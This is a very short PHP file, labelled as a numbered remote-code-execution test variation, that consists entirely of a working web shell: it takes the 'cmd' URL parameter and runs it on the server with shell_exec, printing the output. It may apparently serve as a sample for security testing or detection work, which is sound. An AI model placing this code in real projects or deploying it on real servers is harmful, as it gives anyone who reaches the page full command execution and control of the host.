<?php
// RCE test variation #86
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>